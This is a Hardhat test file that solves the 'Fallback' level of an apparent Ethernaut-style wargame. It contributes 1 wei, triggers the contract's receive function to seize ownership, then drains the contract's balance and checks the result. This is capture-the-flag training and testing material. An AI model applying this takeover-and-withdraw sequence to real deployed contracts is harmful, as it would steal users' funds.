import { loadFixture } from "@nomicfoundation/hardhat-toolbox/network-helpers";
import { expect } from "chai";
import hre from "hardhat";

import { Fallback, FallbackFactory, FallbackFactory__factory, Fallback__factory } from "../typechain-types";
import { FixtureContext, FixtureLevel, deployEssentials, deployLevel } from "./fixtures";
import { completeLevel } from "./helpers";

describe("1. Fallback level", function () {
  let context: FixtureContext;
  let level: FixtureLevel<FallbackFactory, Fallback>;

  beforeEach(async function () {
    context = await loadFixture(deployEssentials);
    level = await deployLevel(context, FallbackFactory__factory, (address, signer) =>
      Fallback__factory.connect(address, signer),
    );
  });

  it("should be attacked successfully", async function () {
    // 1) contribute 1 wei
    const txContrib = await level.instance.connect(context.player).contribute({ value: 1 });
    await expect(txContrib).to.not.reverted;
    await txContrib.wait();
    expect(await level.instance.connect(context.player).getContribution()).to.be.eq(1);

    // 2) trigger receive function
    const sendTx = await context.player.sendTransaction({ to: level.instance, value: 1 });
    await sendTx.wait();

    // check that ownership is claimed
    expect(await level.instance.owner()).to.eq(context.player);

    // withdraw instance funds
    const instanceBalanceBefore = await hre.ethers.provider.getBalance(level.instance);

    const playerBalanceBefore = await hre.ethers.provider.getBalance(context.player);
    const txWithdraw = await level.instance.connect(context.player).withdraw();
    await expect(txWithdraw).to.not.reverted;
    const rcptWithdraw = await txWithdraw.wait();
    if (!rcptWithdraw) {
      expect.fail("Withdraw tx receipt is empty.");
    }

    // instance balance should be zero
    expect(await hre.ethers.provider.getBalance(level.instance)).to.eq(0);

    // player balance should be increased correspondingly
    const playerBalanceAfter = await hre.ethers.provider.getBalance(context.player);
    expect(playerBalanceAfter).eq(
      instanceBalanceBefore + playerBalanceBefore - rcptWithdraw.gasUsed * rcptWithdraw.gasPrice,
    );

    await completeLevel(context, level);

    // ensure that there is no failed submission
    expect(await context.statistics.getNoOfFailedSubmissionsForLevel(level.factory)).to.be.equal(0);
  });
});
